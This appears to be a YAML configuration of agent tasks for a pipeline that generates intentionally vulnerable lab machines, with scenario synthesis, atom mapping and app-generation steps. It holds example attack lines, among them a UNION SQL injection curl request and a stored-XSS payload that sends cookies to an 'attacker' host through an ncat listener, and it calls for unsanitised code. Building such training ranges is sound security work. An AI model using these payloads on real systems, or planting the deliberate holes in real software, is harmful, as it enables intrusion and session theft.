synthesize_scenario_task:
  description: >
    A user has requested the following vulnerable environment:

    "{initial_prompt}"

    The downstream pipeline can build with these atoms:

    {available_atoms}

    Produce a SynthesizedScenario that fully elaborates this request into a
    concrete, internally-consistent environment specification. Resolve every
    implicit decision: what OS users exist, what their passwords are, which
    services run, how credentials bridge between layers, and what the complete
    attacker path looks like from initial discovery to privilege escalation.

    Only include what the user asked for and what is structurally necessary to
    connect the scenario. Do not add game artifacts, extra users for flavour,
    or services beyond what's needed.

    DIVERSITY REQUIREMENT:
    The atom library contains many viable technique combinations. You MUST NOT
    default to the same chain you would "naturally" choose. Actively consider
    all atoms in the available list and construct a chain that is distinct from
    the most obvious pairing. 
    
    If the request implies a custom web application, describe it in
    custom_app_scope (single-file, single-endpoint, Tier 1 only). If the
    request is misconfig-only, set custom_app_scope to null and custom_vectors
    to an empty list [].

    CUSTOM APP VECTORS (custom_vectors field):
    When custom_app_scope is non-null, also populate custom_vectors with one
    CustomVector per distinct web app in the scenario. Each CustomVector must
    contain:
      - vuln_atom_ids: a LIST of exact web vuln atom ids from the available list
        above. Use a single-element list for a standalone vulnerability, or a
        multi-element list when multiple vulnerabilities CHAIN WITHIN ONE APP.
        Available ids: "sqli_union", "ssti_jinja2", "cmd_injection",
        "file_upload_bypass", "path_traversal_lfi", "xss_stored",
        "xss_reflected", "sqli_tautology", "sqli_blind", "xss_admin_bot"
      - attack_chain_goals: a LIST of attack outcomes this app enables. Use one
        goal per vuln atom (same order). Available goals:
        "credential_theft", "auth_bypass", "rce_via_cmd_injection",
        "rce_via_webshell", "rce_via_sqli", "lfi_to_rce",
        "upload_lfi_rce", "session_theft_via_xss"
      - runtime_id: the web technology; use one of: "apache_php", "flask",
        "express"
      - port: 80 for apache_php, 5000 for flask, 3000 for express
      - db_name: MySQL database name (null if no DB)
      - db_user: MySQL user for the app (null if no DB)
      - db_password: DB user password — must be realistic, not security-themed
      - seed_username: OS username whose credentials are seeded into the app DB
        (must exactly match the username in misconfig_scope if bridged)
      - seed_password: their password (must exactly match misconfig_scope value)
      - synthesis_context: 2-4 sentence prose describing this specific app's
        vulnerability, the credentials it exposes, and its role in the attack chain

    CRITICAL — CHAINING VULNS IN ONE APP:
    When the user's request describes multiple vulnerabilities that work TOGETHER
    within a single application (e.g. "file upload + LFI to execute uploaded
    webshells", or "SQLi to steal creds + stored XSS"), emit ONE CustomVector
    with MULTIPLE entries in vuln_atom_ids and attack_chain_goals. Do NOT create
    separate CustomVectors for vulns that belong to the same app — separate
    vectors produce separate apps that overwrite each other on the same port.

    WHEN TO USE MULTIPLE VECTORS vs ONE MULTI-VULN VECTOR:
    - ONE vector with multiple atom ids: vulns chain in a single app (upload +
      LFI, SQLi + stored XSS in the same app)
    - MULTIPLE vectors with one atom id each: completely independent apps on
      different ports or different runtimes

    PRESET APP VECTORS (preset_vectors field):
    When the user requests a REAL-WORLD web application (not a custom single-file
    app), populate preset_vectors instead of custom_vectors. Currently supported
    preset apps:
      - "wordpress": WordPress CMS (LAMP stack). Use when the user asks for
        WordPress, a blog, a CMS, or similar.
      - "phpbb": phpBB forum (LAMP stack). Use when the user asks for a forum,
        bulletin board, phpBB, or similar.

    Each PresetVector must contain:
      - preset_id: one of "wordpress", "phpbb"
      - vuln_profile_ids: list of vulnerability profiles to apply. Available:
        For wordpress: ["wp_default_creds", "wp_seeded_credential"]
        For phpbb: ["phpbb_default_creds"]
        "wp_seeded_credential" requires extra_vars with seed_username and
        seed_password — the OS user credentials hidden in a private WordPress
        post. These must match the username/password in misconfig_scope.
      - port: 80 (both use Apache)
      - admin_user: admin username (realistic, e.g. "admin", "wpadmin")
      - admin_password: admin password (realistic, not security-themed)
      - db_name: database name (null to use preset default)
      - db_user: database user (null to use preset default)
      - db_password: database password (null to use preset default)
      - synthesis_context: 1-2 sentence description of this app's role

    IMPORTANT: If the user asks for WordPress, phpBB, or any supported preset app,
    use preset_vectors — do NOT use custom_vectors or custom_app_scope for these.
    custom_vectors is for LLM-generated single-file vulnerable apps only.

    The narrative describes the ENVIRONMENT. The attack_narrative describes the
    OPERATOR'S JOURNEY through it. The scopes tell downstream pipelines exactly
    what to build. Be specific about credential values, service types, and
    user accounts — but keep passwords realistic (like something an actual
    person would choose, e.g. "TigerLily99#" not "P@ssw0rd!").

    CRITICAL — misconfig_scope format:
    Write misconfig_scope as an attacker-facing scenario description, NOT as
    deployment instructions. The downstream parser extracts initial_access_vectors
    and post_exploitation_goals from this text — it needs to read like a
    vulnerability description, not a recipe.

    WRONG (deployment instructions — parser finds nothing):
      "Deploy user 'wikiuser' with password 'Redwood#2021'. Apply a sudoers
       rule granting passwordless sudo. Install python3-flask."

    RIGHT (attacker-facing description — parser extracts vectors):
      "The server exposes SSH. A user account 'wikiuser' (password 'Redwood#2021')
       exists and is accessible via SSH login. Once logged in, wikiuser has an
       unconditional passwordless sudoers rule allowing full privilege escalation
       to root."

    If the custom app handles initial access entirely (e.g. SSTI gives a shell),
    misconfig_scope should still describe the post-exploitation surface — the OS
    user whose credentials the app leaks, and any privilege escalation path.

    CRITICAL — NO OVERLAP BETWEEN custom_vectors AND misconfig_scope:
    Vulnerabilities handled by custom_vectors (web app vulns like file upload,
    LFI, SQLi, XSS, SSTI, command injection) MUST NOT also appear in
    misconfig_scope. The misconfig pipeline generates independent bash snippets
    for each atom — if the same web vulnerability appears in both pipelines,
    they will produce conflicting deployments that overwrite each other.
    misconfig_scope should ONLY describe: OS-level misconfigurations, service
    misconfigurations (SSH, Samba, cron, SUID), user accounts, and privilege
    escalation paths. If the entire scenario is web-app-only with no OS-level
    misconfigs, set misconfig_scope to an empty string "".

    NUM_BOXES — how many separate machines this scenario requires:
    Set num_boxes to the minimum number of distinct machines needed to realise
    the scenario as described. Use these guidelines:
      - 1 box: self-contained scenario — all services, credentials, and privesc
        paths exist on a single host.
      - 2 boxes: pivot / lateral movement scenarios — e.g. initial access on one
        machine whose credentials or tokens allow access to a second machine.
      - 3+ boxes: multi-hop chains — each additional box adds a distinct hop
        with its own access method and post-exploitation surface.
    Do NOT inflate the count. Only count a box if the scenario structurally
    requires a separate machine (separate IP / hostname / trust boundary).

    BOX DESCRIPTIONS (required when num_boxes > 1):
    When the scenario requires multiple machines, populate the `boxes` list with
    one BoxSpec per machine. Leave the top-level misconfig_scope as "" and
    custom_vectors as [] — the per-box detail lives entirely in `boxes`.

    Each BoxSpec must have:
      - box_id: short unique identifier, lowercase, hyphens allowed
        (e.g. "webserver", "db-server", "jumpbox")
      - hostname: network hostname for this machine (e.g. "web01", "db01")
      - role: 1–2 sentence narrative describing what this machine is
      - misconfig_scope: attacker-facing vulnerability description for THIS box
        only — same format rules as single-box misconfig_scope above.
        Must include ALL credential values that appear in shared_secrets where
        this box is either the source or target.
      - custom_app_scope: custom web app description for this box, or null
      - custom_vectors: list of CustomVector objects for this box, or []
      - services: exposed services in "protocol:port" format
        (e.g. ["ssh:22", "http:80", "mysql:3306"])

    SHARED SECRETS (required when num_boxes > 1 and boxes share credentials):
    For every credential that bridges two machines, add a SharedSecret to
    `shared_secrets`:
      - key: short identifier (e.g. "web_to_db_ssh", "pivot_mysql_cred")
      - value: the EXACT credential string (password, not a placeholder)
      - description: what this credential is and how it bridges the machines
      - source_box: box_id where the attacker discovers/extracts this credential
      - target_box: box_id where this credential grants access
      - target_user: username on the target box this credential authenticates as
      - access_method: one of "ssh", "mysql", "web_login", "smb", "ftp"

    CRITICAL: Every shared_secret value MUST appear verbatim in BOTH
    the source box's misconfig_scope AND the target box's misconfig_scope
    so downstream pipelines generate consistent deploy scripts with matching
    credentials.

    TACTICAL DISPLAY FIELDS:
    For each BoxSpec (multi-box) OR at the top level (single-box), also populate:
      - attack_vector: concise arrow-chain summarising the attack surface on this
        box (e.g. "Unauthenticated Web RCE -> SUID Data Exfiltration")
      - goal: the attacker's objective for this box
        (e.g. "Harvest internal credentials for [backup01]" or
        "Full Administrative Compromise")

    Also populate kill_chain (list of KillChainStep) covering the full attack path
    across ALL boxes in order. Each step has:
      - tag: one of ENUM, WEB, CRED, RCE, LPE, LAT, PERSIST, EXFIL
      - action: what the attacker does and what they achieve, in one line
        (e.g. "Upload PHP Webshell -> Achieve www-data shell")

    The kill chain should read like a numbered operation plan. Use -> to separate
    action from outcome within each step.
  expected_output: >
    A SynthesizedScenario JSON object with: narrative (str), attack_narrative (str),
    shared_resources (list of str), explicit_decisions (list of str), num_boxes (int),
    kill_chain (list of KillChainStep), attack_vector (str), goal (str).

    Single-box (num_boxes == 1):
      misconfig_scope (str), custom_app_scope (str or null),
      custom_vectors (list of CustomVector or []),
      preset_vectors (list of PresetVector or []),
      boxes=[], shared_secrets=[],
      attack_vector (str), goal (str), kill_chain (list of KillChainStep).

    Multi-box (num_boxes > 1):
      boxes (list of BoxSpec — one per machine), shared_secrets (list of
      SharedSecret — one per cross-box credential), misconfig_scope="",
      custom_vectors=[], preset_vectors=[], custom_app_scope=null,
      kill_chain (list of KillChainStep).

    Each CustomVector has: vuln_atom_ids (list of str), attack_chain_goals (list of str),
    runtime_id, port, db_name, db_user, db_password, seed_username, seed_password,
    synthesis_context.
    Each PresetVector has: preset_id, vuln_profile_ids, port, admin_user,
    admin_password, db_name, db_user, db_password, synthesis_context, extra_vars.
    Each BoxSpec has: box_id, hostname, role, misconfig_scope, custom_app_scope,
    custom_vectors, preset_vectors, services, attack_vector, goal.
    Each SharedSecret has: key, value, description, source_box, target_box,
    target_user, access_method.
    Each KillChainStep has: tag, action.
  agent: scenario_synthesis_agent

parse_request_task:
  description: >
    Analyze the user's request: "{initial_prompt}" and break it down into context, initial access vectors, and post-exploitation goals.
    This scenario requires {num_boxes} box(es). Keep this in mind when identifying access vectors and exploitation goals.

    CROSS-BOX CONSTRAINT BLOCK:
    The prompt may contain a section starting with
    "--- CROSS-BOX CONSTRAINTS (do not change these values) ---".
    This section describes services and credentials on OTHER boxes in the topology.
    Services listed under "Neighbouring box" headings run on different machines and
    MUST NOT be included in initial_access_vectors or post_exploitation_goals for
    this box. Extract only what this box itself exposes and exploits.
  expected_output: >
    A single valid JSON object — no markdown, no surrounding text.
    Start the response with { and end with }. All keys must be quoted strings.
    The JSON object must be a ParsedRequest containing the parsed components of the request.
  agent: request_parser_agent

map_atoms_task:
  description: >
    You have been given a ParsedRequest as context from the previous task. It contains:
    - `initial_access_vectors`: a list of strings describing how the attacker gains initial access.
    - `post_exploitation_goals`: a list of strings describing what the attacker wants to achieve after gaining access.

    If you don't have a parsedRequest please run the tool called `search_vulnerability_atoms` with the query "NOT_WORKING" to get it before starting this task.

    YOUR INSTRUCTIONS (follow them in order):
    1. Read the ParsedRequest output from context. Identify every item in `initial_access_vectors` and `post_exploitation_goals`.
    2. For EACH item, call the `search_vulnerability_atoms` tool with a concise search query derived from that item.
       Example: if an access vector is "SMB share with anonymous access containing a sensitive file", call:
       Action: search_vulnerability_atoms
       Action Input: {"query": "insecure samba share anonymous access"}
    3. The tool may return MULTIPLE Atom results separated by "--- ATOM: <id> ---" headers.
       For each result, read the Atom markdown carefully:
       - Extract the Atom's `id` (the string after "--- ATOM:") and its `required_vars` from the frontmatter.
       - Evaluate how well it matches the user's specific requirement.
       Map ALL Atoms that are necessary to fully implement the requirement. A single requirement may
       need several complementary Atoms (e.g., "Samba share containing a backup file with credentials"
       needs both a `samba_insecure_share` atom AND a `sensitive_file` atom). However, only include
       an Atom if it is genuinely required — do not include loosely related ones.
       If none of the returned Atoms are a good fit, issue a more specific follow-up search query.
    4. Map the user's specific requirements to the selected Atom's parameters using its `required_vars`.
    5. Build a MappedRequest with:
       - `section`: a short label summarizing the overall scenario.
       - `mapped_initial_access_atoms`: list of MappedAtom objects for initial access.
       - `mapped_post_exploitation_goal_atoms`: list of MappedAtom objects for post-exploitation.

    Each MappedAtom must have:
    - `name`: the exact Atom id (e.g., "samba_insecure_share")
    - `context`: a brief explanation of why this Atom was chosen
    - `parameters`: a dict of key-value pairs matching the Atom's required_vars (e.g., {"share_name": "public", "path": "/srv/share"})
      For atoms whose `required_vars` is empty, use an empty JSON object: `"parameters": {}`

    CRITICAL OUTPUT RULE: Your ENTIRE response must be a single valid JSON object
    and NOTHING ELSE. No markdown, no headers, no reasoning text, no numbered lists,
    no backticks, no explanations, no trailing comments. Do all reasoning internally.
    Do NOT write any text after the closing `}` of the JSON object.

    IMPORTANT: You MUST call the search tool at least once. Do NOT skip the tool or guess Atom names.

    CROSS-BOX EXCLUSION RULE:
    If the original prompt contained a "--- CROSS-BOX CONSTRAINTS ---" section describing
    services on neighbouring boxes (e.g. "Neighbouring box \"db-server\" ... exposes: mongodb:27017"),
    those services are installed and configured on OTHER machines. Do NOT map atoms for them on this box.
    Only map atoms for services that this box itself must run.
  expected_output: >
    A single valid JSON object — no markdown, no surrounding text, no reasoning before or after.
    Start the response with { and end with }. All keys must be quoted strings.
    The JSON object must be a MappedRequest with `section`, `mapped_initial_access_atoms`, and `mapped_post_exploitation_goal_atoms`.
    Each mapped atom must have `name` (the Atom id), `context` (why it was chosen), and `parameters` (a dict of config values).
  agent: mapping_agent

validate_mapping_task:
  description: >
    You are auditing the Mapping Agent's output. You have two pieces of context:
      1. The ParsedRequest (from parse_request_task) — your source of truth for
         what the user actually asked for.
      2. The MappedRequest (from map_atoms_task) — the mapper's output to audit.

    YOUR INSTRUCTIONS:

    STEP 1 — Extract the raw requirement strings.
    Read `initial_access_vectors` and `post_exploitation_goals` from the
    ParsedRequest. Note which list each string belongs to.

    STEP 2 — Independently atomize each requirement string.
    For each string, reason about what discrete atomic building blocks it implies.
    Break compound requirements into individual, specific descriptions.
    Example:
      "an exposed phpMyAdmin instance with authentication disabled containing a
       database with a user table of weak credentials usable for SSH login"
      → atomized descriptions:
          - "install phpMyAdmin web interface"
          - "phpMyAdmin authentication disabled or bypassed"
          - "database user table containing weak plaintext credentials"
          - "SSH user account with weak password"

    STEP 3 — Search for the best-matching Atom for each atomized description.
    For EACH atomized description, call:
      Action: search_vulnerability_atoms
      Action Input: {"query": "<atomized description>", "n_results": 1}
    Record the Atom `id` returned (the string after "--- ATOM:").

    STEP 4 — Diff against the existing MappedRequest.
    The MappedRequest output from the map_atoms_task is available in your context
    (injected automatically). Read it and extract all Atom names already present
    in `mapped_initial_access_atoms` and `mapped_post_exploitation_goal_atoms`.

    STEP 5 — Add any missing Atoms.
    For each Atom `id` you found in Step 3 that does NOT appear in the current
    MappedRequest, create a new MappedAtom:
      - `name`: the Atom id exactly as returned by the tool
      - `context`: why this atom is needed (reference the original requirement string)
      - `parameters`: a dict populated from the Atom's `required_vars` (read from
        the returned markdown) and any specific values from the user's request

    Add it to `mapped_initial_access_atoms` if it relates to an initial access
    vector, or `mapped_post_exploitation_goal_atoms` if it relates to a
    post-exploitation goal.

    STEP 6 — Output the final MappedRequest.
    Return a MappedRequest that merges the original mapper's atoms with any you
    added. Keep the original `section` value. If no atoms were missing, return
    the MappedRequest unchanged.

    CRITICAL OUTPUT RULE: Your ENTIRE response must be a single valid JSON object
    and NOTHING ELSE. No markdown, no headers, no reasoning text, no numbered lists,
    no backticks, no explanations, no trailing comments. Do all reasoning internally.
    Do NOT write any text after the closing `}` of the JSON object.
    For any atom whose `required_vars` is empty, set `"parameters": {}`.

    You MUST call `search_vulnerability_atoms` for every atomized description.
    Never skip a search or invent Atom names.
  expected_output: >
    A structured MappedRequest JSON object with `section`,
    `mapped_initial_access_atoms`, and `mapped_post_exploitation_goal_atoms`.
    This is either identical to the input MappedRequest (if complete) or extended
    with any Atoms the original mapper missed. Each MappedAtom has `name`,
    `context`, and `parameters`.
  agent: mapping_validator_agent

enumerate_dependencies_task:
  description: >
    You have been given a validated MappedRequest as context from the previous
    task. Your job is twofold:
      A. Ensure a `create_user` atom exists for EVERY OS user referenced across
         all atoms (with the correct password if one appears in the scenario).
      B. Ensure an `install_package` atom exists for every OS package implicitly
         required by the scenario.

    ═══════════════════════════════════════════════════════
    PART A — USER DEPENDENCY ENUMERATION
    ═══════════════════════════════════════════════════════

    STEP A1 — Collect every username referenced in the mapping.
    Scan ALL atoms in both lists. A username is referenced when it appears in
    ANY of these parameter keys:
      - `username`, `cron_user`, `script_owner`, `target_username`,
        `reader_user`, `escalation_user`, `attacker_user`, `target_user`
    Also scan atom `context` fields for phrases like "user 'NAME'" or
    "account 'NAME'" that name OS users.
    Build a set of all unique usernames found.

    STEP A2 — Identify passwords for each user.
    For each username, search ALL atom parameters and context strings for a
    matching password. Common locations:
      - `password`, `target_password` parameters
      - Context strings like "password 'VALUE'" or "(password VALUE)"
      - Env var atoms where `var_value` is a password for the same user
    If a password is found, record it. If not, the user has no password (service
    account or key-based access).

    STEP A3 — Check for existing `create_user` atoms.
    For each username, check whether a `create_user` atom with
    `parameters.username == <username>` already exists in either list.
    If it does AND it already has the correct password, skip it.
    If it exists but is MISSING the password (and one was found in A2), update
    the existing atom's parameters to include the password.

    STEP A4 — Add missing `create_user` atoms.
    For each username that has NO corresponding `create_user` atom, call:
      Action: search_vulnerability_atoms
      Action Input: {"query": "create user account", "n_results": 1}
    Confirm the atom id is `create_user` and read its `required_vars`.
    Create a new MappedAtom:
      - `name`: "create_user"
      - `context`: "OS user '<username>' is referenced by <atom_name> and must
        exist before that atom runs"
      - `parameters`: {"username": "<username>", "password": "<password>"}
        (omit password key if no password was found in A2)
    Append to `mapped_initial_access_atoms`.

    IMPORTANT: Some atoms (e.g. ssh_password_login, shell_history_credential_exposure)
    create users INLINE in their code snippets. That is an implementation detail —
    you must STILL add an explicit `create_user` atom for every referenced user.
    The snippet generator will see the `create_user` atom and generate the user
    creation commands, and downstream atoms will NOT duplicate user creation.

    ═══════════════════════════════════════════════════════
    PART B — PACKAGE DEPENDENCY ENUMERATION
    ═══════════════════════════════════════════════════════

    STEP B1 — Read all atoms.
    List every atom in `mapped_initial_access_atoms` and
    `mapped_post_exploitation_goal_atoms`, including their `name`, `context`,
    and `parameters`.

    STEP B2 — Identify required packages.
    For each atom, reason about what Ubuntu/Debian packages it needs at runtime:
      - `samba_insecure_share`            → samba
      - `sensitive_file` with a .zip path → zip
      - `set_suid` on a non-base binary   → that binary's apt package
        (e.g. binary_path "/usr/bin/vim" → package "vim",
               binary_path "/usr/bin/find" → already in base, skip)
      - `cron_job_hijack` or `writable_cron_script` → cron
      - Any atom whose `context` mentions SSH as the access method,
        OR any scenario where a `create_user` atom is present and the overall
        context implies SSH login                                → openssh-server

    Also read the `section` field and all atom `context` strings for any service
    or tool names that imply additional packages not covered above.

    STEP B3 — Deduplicate and diff.
    Build a flat list of all required package names. Remove any for which an
    `install_package` atom already exists in `mapped_initial_access_atoms`
    with matching `parameters.package_name`.

    STEP B4 — Confirm atom format via RAG.
    For each missing package, call:
      Action: search_vulnerability_atoms
      Action Input: {"query": "install package <package_name>", "n_results": 1}
    Read the returned atom to confirm the `id` is `install_package` and note
    its `required_vars`. This grounds your output in real atom data.

    STEP B5 — Build and add the new MappedAtoms.
    For each missing package, create:
      - `name`: "install_package"
      - `context`: "<package_name> is required by <atom_name> to function at runtime"
      - `parameters`: {"package_name": "<package_name>"}
    Append each to `mapped_initial_access_atoms`.

    ═══════════════════════════════════════════════════════

    STEP FINAL — Return the updated MappedRequest.
    Output a MappedRequest identical to the input except for the newly appended
    `create_user` and `install_package` atoms. Keep `section` and all existing
    atoms unchanged.

    CRITICAL OUTPUT RULE: Your ENTIRE response must be a single valid JSON object
    and NOTHING ELSE. No markdown, no headers, no reasoning text, no numbered lists,
    no backticks, no explanations, no trailing comments. Do all reasoning internally.
    Do NOT write any text after the closing `}` of the JSON object.

    You MUST call `search_vulnerability_atoms` for each missing user and package.
    Never skip the tool or invent atom names.

    CROSS-BOX EXCLUSION RULE:
    If the original scenario prompt contained a \"--- CROSS-BOX CONSTRAINTS ---\" section
    listing services on neighbouring boxes (e.g. \"Neighbouring box 'db-server' ... exposes:
    mongodb:27017\"), those packages are installed on OTHER machines. Do NOT add
    install_package atoms for them here.
  expected_output: >
    A single valid JSON object — no markdown, no surrounding text.
    Start the response with { and end with }. All keys must be quoted strings.
    The JSON object must be a MappedRequest identical to the input except that
    `mapped_initial_access_atoms` now includes:
      - One `create_user` MappedAtom per OS user referenced across all atoms
        that did not already have one. Each has `name`: "create_user", a clear
        `context`, and `parameters`: {"username": "<user>", "password": "<pw>"}
        (password omitted if none was found).
      - One `install_package` MappedAtom per implicitly required package that
        was not already present. Each has `name`: "install_package", a clear
        `context`, and `parameters`: {"package_name": "<package>"}.
  agent: dependency_enumeration_agent

sequence_atoms_task:
  description: >
    You have been given a validated MappedRequest as context from the previous
    task. It contains two lists of MappedAtom objects:
      - `mapped_initial_access_atoms`: atoms needed to establish initial access.
      - `mapped_post_exploitation_goal_atoms`: atoms needed for post-exploitation.

    YOUR TASK: Produce a single, flat, correctly ordered list of ALL these atoms
    combined, so that a deployment script executed top-to-bottom will succeed.

    Think through these steps internally before producing your output:
    1. List every atom's `name` and `parameters` from both lists.
    2. Reason about dependencies — what each atom needs to exist before it runs,
       and which other atoms provide those prerequisites.
    3. Apply these ordering rules:
       a. `install_package` atoms always run first.
       b. `create_user` runs before any atom whose parameters reference that
          user's username (in ANY parameter key: username, cron_user,
          script_owner, target_username, reader_user, escalation_user, etc.).
       c. `samba_insecure_share` runs before `sensitive_file` if the file_path
          is inside the share's path (the share creates the directory).
       d. `cron_job_hijack` (or any cron-related atom) runs AFTER the
          `create_user` for its `cron_user` — the user must exist before a
          cron entry can run commands as that user.
       e. All `mapped_initial_access_atoms` run before all
          `mapped_post_exploitation_goal_atoms`.
       f. Within a group, preserve original order unless a dependency rule overrides.

    CRITICAL OUTPUT RULE: Your ENTIRE response must be a single valid JSON object
    and NOTHING ELSE. No markdown, no headers, no reasoning text, no numbered lists,
    no backticks, no explanations. Do all reasoning internally.
    The JSON object must be a SequencedRequest with a single `atoms` field: a list
    of MappedAtom objects in the determined execution order. Each MappedAtom must
    include its original `name`, `context`, and `parameters` unchanged.
  expected_output: >
    A single SequencedRequest JSON object — no surrounding text or markdown.
    It has one `atoms` field containing all MappedAtom objects in correct
    dependency-resolved execution order. Each atom retains its original
    `name`, `context`, and `parameters`.
  agent: sequencing_agent

generate_app_task:
  description: >
    Generate a complete, deployable vulnerable web application.

    This application must implement {num_vulns} vulnerability/vulnerabilities in a
    SINGLE application file. When multiple vulnerabilities are specified, they form
    an attack chain within one app (e.g. file upload + LFI = upload a webshell then
    include it via LFI for RCE). Do NOT create separate apps — combine all vulns
    into one cohesive application with multiple endpoints/handlers.

    VULN ATOM(S):
    {vuln_atom}

    ATTACK GOAL(S):
    {attack_goal}

    WEB RUNTIME:
    {web_runtime}

    SYNTHESIS CONTEXT:
    {synthesis_context}

    {failure_context}

    YOUR TASK:
    1. Read ALL VULN ATOM Synthesis Guidance sections — each is a blueprint for one
       vulnerability. Use the language example that matches the WEB RUNTIME. When
       multiple atoms are provided, implement ALL of them in one file with separate
       endpoints or handlers (e.g. one endpoint for upload, another for file inclusion).
    2. Read the SYNTHESIS CONTEXT to understand the exact credentials, usernames, and
       scenario details. Seed data MUST match synthesis_context exactly.
    3. Read ALL ATTACK GOAL test_templates and success_criteria — your attack_objective
       must provide a structured task for the Attack Orchestrator to demonstrate the
       FULL chain across all vulnerabilities. For chained attacks, the attack_objective
       should describe each step in sequence (e.g. upload webshell first, then trigger
       it via LFI).
    4. Write app_source as a single file implementing ALL vulnerabilities. Each vuln
       should have its own endpoint/route. The vulnerabilities must be exactly as
       described in the atoms' Synthesis Guidance — do not sanitise them or add protections.
    5. Write schema_sql to create the necessary tables (or null if no DB needed).
    6. Write seed_sql to insert the seed credentials from synthesis_context (or null).
    7. Write setup_db_sh to start the DB service, create the DB and user, and run
       schema + seed. Must be idempotent (IF NOT EXISTS throughout). Use
       `service mysql start` not `systemctl start` (no systemd init in Docker).
       Set to null if no database is needed.
    8. Write deploy_snippet to:
       a. Install ALL required_packages listed in WEB RUNTIME using apt-get:
          `DEBIAN_FRONTEND=noninteractive apt-get install -y <packages>`
          Run `apt-get update -qq` first. If the app needs a MySQL-compatible database,
          install `mariadb-server` (NOT mysql-server — it fails to configure in Docker).
          Start it with `service mariadb start && sleep 2`.
       b. Copy files from /tmp/goe_app/ to the runtime app_dir.
       c. Run setup_db_sh to initialise the database (skip if null).
       d. Configure and start the web server.
       e. Create any directories the app needs (e.g. uploads directory with correct
          ownership for www-data).
       The target container may have the runtime's required packages pre-installed,
       but your deploy_snippet MUST STILL include all apt-get install commands
       because the same script is used on bare EC2 instances.
       For Node.js/Express apps: install Node.js 20 via NodeSource (Ubuntu 22.04
       apt ships v12 which is broken for modern packages):
         curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
         apt-get install -y nodejs
       Then: cd /opt/webapp && npm init -y && npm install express (plus any other
       packages like better-sqlite3, cookie-parser, mysql2, puppeteer) BEFORE
       starting the app. Do NOT use `apt-get install nodejs npm` — it gives v12.
       All in bash, no shebang.
    9. Write testing_snippet to verify: (a) the web server is responding, (b) EACH
       vulnerability is present in the app. For chained vulns, test the full chain.
       Run inside the target container.
    10. Write attack_objective as a structured multi-step task for the Attack Orchestrator.
        Format each step with a prefix:
        - "Run in attacker: <command>" for CLI commands from the attacker container
        - "In browser: <action>" for browser-based actions (form filling, clicking, navigation)
        - "Run in target: <command>" for diagnostics in the target (rarely needed)
        End with "Success criterion: <observable outcome or regex pattern>".
        For multi-vuln apps, describe each exploitation step in sequence.
        The target is addressed as hostname "target" on the runtime's default port.

        Example for SQLi:
          Step 1: Run in attacker: curl -s "http://target:5000/search?q=x'+UNION+SELECT+username,password+FROM+users--+-"
          Success criterion: response contains a bcrypt hash or plaintext credential

        Example for XSS cookie theft:
          Step 1: Run in attacker: rm -f /tmp/exfil.txt && ncat -lnvp 9999 > /tmp/exfil.txt &
          Step 2: Run in attacker: curl -s -X POST "http://target:3000/comment" --data-urlencode "comment=<script>new Image().src='http://attacker:9999/?c='+document.cookie</script>"
          Step 3: In browser: navigate to http://target:3000/admin to receive admin session cookie, then navigate to http://target:3000/ to trigger the stored XSS payload
          Step 4: Run in attacker: sleep 10 && cat /tmp/exfil.txt
          Success criterion: /tmp/exfil.txt contains connect.sid= or admin_token=

        CRITICAL FOR XSS APPS: Do NOT add Puppeteer, chromium, or any admin-bot
        inside the app. Do NOT add a trigger-bot endpoint. Chromium is NOT available
        in the target container. Instead, use "In browser:" steps in attack_objective
        — the external browser sidecar will simulate the admin visiting the page.
        The app only needs: (1) POST endpoint to store comments unsanitized,
        (2) GET endpoint to render stored comments (XSS fires here),
        (3) /admin endpoint that sets a non-HttpOnly session cookie.

        CRITICAL: Session cookies for XSS theft MUST be non-HttpOnly so JS can
        read document.cookie. In Express use:
          res.cookie('admin_token', 'value', { httpOnly: false, path: '/' });
        NEVER use res.setHeader('Set-Cookie', '...HttpOnly=false') — that syntax
        sets HttpOnly to true (the =false is ignored).

    CRITICAL OUTPUT RULE: Your ENTIRE response must be a single valid JSON object
    and NOTHING ELSE. No markdown, no headers, no reasoning text, no numbered lists,
    no backticks, no explanations, no trailing comments. Do all reasoning internally.
    Do NOT write any text after the closing `}` of the JSON object.

    Port for this deployment: {port}
  expected_output: >
    A single valid JSON object — no markdown, no surrounding text.
    Start the response with { and end with }. All keys must be quoted strings.
    The JSON object must be a GeneratedApp with: app_filename (str), app_source (str),
    schema_sql (str or null), seed_sql (str or null), setup_db_sh (str or null),
    deploy_snippet (str), testing_snippet (str), attack_objective (str).
  agent: app_generation_agent

generate_snippets_task:
  description: >
    Generate a Bash code snippet and a testing snippet for the following atom:

    {atom_json}

    This atom is at position {atom_index} of {total_atoms} in the sequenced list.
    Previously generated atoms (already applied, in order):
    {prior_atoms_summary}

    The atom JSON has:
      - `name`: the atom id (e.g. "samba_insecure_share")
      - `context`: why this atom was chosen
      - `parameters`: a dict of values to substitute (may be null if none needed)

    YOUR INSTRUCTIONS (follow in order):

    STEP 1 — Read the atom definition.
    Call `read_atom` with the atom's `name`.
    Example:
      Action: read_atom
      Action Input: {{"atom_name": "samba_insecure_share"}}

    STEP 2 — Reason about the security intent.
    Read the atom's `context` field (from the JSON entry). This is the mapper's
    explanation of WHY this atom was chosen and WHAT security flaw it should
    introduce. Use it to resolve any ambiguity the atom template leaves open:
      - The atom defines the SHAPE of the script; the context defines the INTENT.
      - If the context says "weak credential for SSH lateral movement", make the
        password obviously guessable (e.g. same as the username, or from a
        common wordlist like `rockyou`).
      - If the context implies an insider-threat or sloppy-developer scenario,
        the sensitive file should look plausible (e.g. a backed-up SSH private key
        or a credentials.txt with real-looking entries).
      - If the context names a specific binary, service, or path, use that
        even if the atom's `parameters` dict left it null.
      - When the context and `parameters` agree, `parameters` takes precedence
        for any value it explicitly supplies. For everything else, let context guide you.

    STEP 3 — Generate the code_snippet.
    Using the atom's Logic Requirements, Synthesis Guidance, your context
    reasoning from STEP 2, and the substituted parameters:
      - Write the Bash commands that implement the configuration/vulnerability.
      - Substitute all placeholders with values from `parameters` (or context-
        derived defaults where parameters are null).
      - Ensure that generated usernames, share names, file paths, and credential values are realistic and fit the scenario. Avoid obviously fake values like "password123" or "user1" unless the context implies a very weak credential. Use the get_rockyou_password() tool for weak passwords when appropriate. For file paths, use plausible locations (e.g. /srv/share for samba, or /home/<username>/backup.zip for a sensitive file in a user's home).
      - Do NOT include a shebang line (#!/bin/bash). That is added automatically.
      - Add a brief inline comment above each logical block explaining the
        security rationale (e.g. `# world-readable share for anonymous enumeration`).
      - Do NOT create users (useradd/chpasswd) inside non-create_user atoms.
        User creation is handled exclusively by the `create_user` atom, which
        runs earlier in the sequence. If an atom references a user, assume
        the user already exists. Only `create_user` atoms should contain
        useradd and chpasswd commands.

    STEP 4 — Generate the testing_snippet.
